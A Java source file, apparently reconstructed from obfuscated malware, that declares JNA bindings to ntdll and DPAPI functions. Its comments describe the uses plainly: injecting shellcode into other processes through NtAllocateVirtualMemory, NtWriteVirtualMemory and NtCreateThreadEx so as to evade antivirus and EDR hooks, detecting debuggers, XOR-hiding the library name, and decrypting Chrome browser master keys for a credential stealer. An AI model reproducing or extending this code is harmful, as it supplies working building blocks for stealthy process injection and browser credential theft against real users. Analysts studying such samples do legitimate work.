import com.sun.jna.Native;
import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.WinNT;
import com.sun.jna.ptr.IntByReference;
import com.sun.jna.ptr.PointerByReference;
import com.sun.jna.win32.StdCallLibrary;

/**
 * Windows NT API Interfaces (JNA)
 * Obfuscated names:
 *   ԇ (U+0507) = NtdllInterface (NtQueryInformationProcess)
 *   ԋ (U+050B) = NtdllMemoryInterface (NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx)
 *
 * These interfaces provide direct access to Windows NT kernel functions
 * via JNA (Java Native Access), bypassing higher-level Win32 API wrappers.
 *
 * Using NT functions directly (instead of Win32 equivalents) helps evade:
 * - Antivirus hooks on CreateRemoteThread, VirtualAllocEx, WriteProcessMemory
 * - EDR (Endpoint Detection & Response) monitoring
 * - API call logging and sandboxing
 *
 * The library name ("ntdll") is XOR-obfuscated in the static initializer
 * to avoid string detection.
 *
 * Functions used:
 *
 * NtQueryInformationProcess:
 * - Used for anti-debugging detection
 * - ProcessDebugPort (class 7): returns non-zero if debugger attached
 * - ProcessDebugObjectHandle (class 30): returns debug object handle
 *
 * NtAllocateVirtualMemory:
 * - Allocates memory in a process (like VirtualAllocEx but lower level)
 * - Used to allocate shellcode/payload memory in target process
 *
 * NtWriteVirtualMemory:
 * - Writes to process memory (like WriteProcessMemory but lower level)
 * - Used to write shellcode to allocated memory
 *
 * NtProtectVirtualMemory:
 * - Changes memory protection (like VirtualProtectEx but lower level)
 * - Used to make shellcode executable (PAGE_EXECUTE_READ)
 *
 * NtCreateThreadEx:
 * - Creates a thread in a process (like CreateRemoteThread but lower level)
 * - Harder to detect than CreateRemoteThread
 * - Used to execute injected shellcode
 */
public class NtApiInterfaces {

    /**
     * Interface for NtQueryInformationProcess.
     * Used for anti-debugging checks.
     * Library: ntdll.dll (name XOR-obfuscated as "3AJ[*" ^ key)
     */
    public interface NtdllQueryInterface extends StdCallLibrary {
        NtdllQueryInterface INSTANCE = Native.load("ntdll", NtdllQueryInterface.class);

        /**
         * Queries information about a process.
         *
         * @param ProcessHandle Handle to the process
         * @param ProcessInformationClass Type of information to query:
         *   - 7  = ProcessDebugPort (non-zero if debugger attached)
         *   - 30 = ProcessDebugObjectHandle
         *   - 31 = ProcessDebugFlags
         * @param ProcessInformation Buffer to receive information
         * @param ProcessInformationLength Size of buffer
         * @param ReturnLength Actual bytes written
         * @return NTSTATUS (0 = success)
         */
        int NtQueryInformationProcess(
            WinNT.HANDLE ProcessHandle,
            int ProcessInformationClass,
            Pointer ProcessInformation,
            int ProcessInformationLength,
            int[] ReturnLength
        );
    }

    /**
     * Interface for NT memory manipulation functions.
     * Used for process injection (shellcode/DLL injection).
     * Library: ntdll.dll (name XOR-obfuscated as "E`:\u00169" ^ key)
     */
    public interface NtdllMemoryInterface extends StdCallLibrary {
        NtdllMemoryInterface INSTANCE = Native.load("ntdll", NtdllMemoryInterface.class);

        /**
         * Allocates virtual memory in a process.
         * Equivalent to VirtualAllocEx but at NT level.
         *
         * @param ProcessHandle Target process handle
         * @param BaseAddress Desired base address (null = OS chooses)
         * @param ZeroBits Number of high-order bits that must be zero
         * @param RegionSize Size of region to allocate
         * @param AllocationType MEM_COMMIT|MEM_RESERVE = 0x3000
         * @param Protect PAGE_EXECUTE_READWRITE = 0x40
         * @return NTSTATUS
         */
        int NtAllocateVirtualMemory(
            WinNT.HANDLE ProcessHandle,
            PointerByReference BaseAddress,
            Pointer ZeroBits,
            PointerByReference RegionSize,
            int AllocationType,
            int Protect
        );

        /**
         * Writes to virtual memory in a process.
         * Equivalent to WriteProcessMemory but at NT level.
         *
         * @param ProcessHandle Target process handle
         * @param BaseAddress Address to write to
         * @param Buffer Data to write
         * @param NumberOfBytesToWrite Number of bytes to write
         * @param NumberOfBytesWritten Actual bytes written
         * @return NTSTATUS
         */
        int NtWriteVirtualMemory(
            WinNT.HANDLE ProcessHandle,
            Pointer BaseAddress,
            byte[] Buffer,
            int NumberOfBytesToWrite,
            IntByReference NumberOfBytesWritten
        );

        /**
         * Changes memory protection in a process.
         * Equivalent to VirtualProtectEx but at NT level.
         *
         * @param ProcessHandle Target process handle
         * @param BaseAddress Address of region
         * @param RegionSize Size of region
         * @param NewProtect New protection flags
         * @param OldProtect Previous protection flags
         * @return NTSTATUS
         */
        int NtProtectVirtualMemory(
            WinNT.HANDLE ProcessHandle,
            PointerByReference BaseAddress,
            PointerByReference RegionSize,
            int NewProtect,
            IntByReference OldProtect
        );

        /**
         * Creates a thread in a process.
         * Equivalent to CreateRemoteThread but at NT level.
         * Harder to detect by AV/EDR.
         *
         * @param ThreadHandle Output: handle to created thread
         * @param DesiredAccess THREAD_ALL_ACCESS = 0x1FFFFF
         * @param ObjectAttributes null
         * @param ProcessHandle Target process handle
         * @param StartRoutine Thread start address (shellcode entry point)
         * @param Argument Thread argument (null for shellcode)
         * @param CreateFlags 0 = run immediately, 1 = suspended
         * @param ZeroBits 0
         * @param StackSize 0 = default
         * @param MaximumStackSize 0 = default
         * @param AttributeList null
         * @return NTSTATUS
         */
        int NtCreateThreadEx(
            PointerByReference ThreadHandle,
            int DesiredAccess,
            Pointer ObjectAttributes,
            WinNT.HANDLE ProcessHandle,
            Pointer StartRoutine,
            Pointer Argument,
            int CreateFlags,
            long ZeroBits,
            long StackSize,
            long MaximumStackSize,
            Pointer AttributeList
        );
    }

    /**
     * JNA Library interface for DPAPI operations.
     * Obfuscated name: բ (U+0562)
     *
     * Provides CryptUnprotectData and related functions.
     * Used by ChromeDecryptor to decrypt browser master keys.
     */
    public interface DpapiLibrary extends com.sun.jna.Library {
        /**
         * Decrypts DPAPI-encrypted data.
         * @return 1 on success, 0 on failure
         */
        int CryptUnprotectData(Object[] args);

        /**
         * Encrypts data with DPAPI.
         * @return 1 on success, 0 on failure
         */
        int CryptProtectData(Object[] args);

        /**
         * Frees memory allocated by CryptUnprotectData.
         * @return 1 on success, 0 on failure
         */
        int LocalFree(Object[] args);
    }

    /**
     * Empty JNA Library interface.
     * Obfuscated name: ա (U+0561)
     * Likely a base interface or placeholder.
     */
    public interface BaseLibrary extends com.sun.jna.Library {
        // Empty - base interface
    }
}
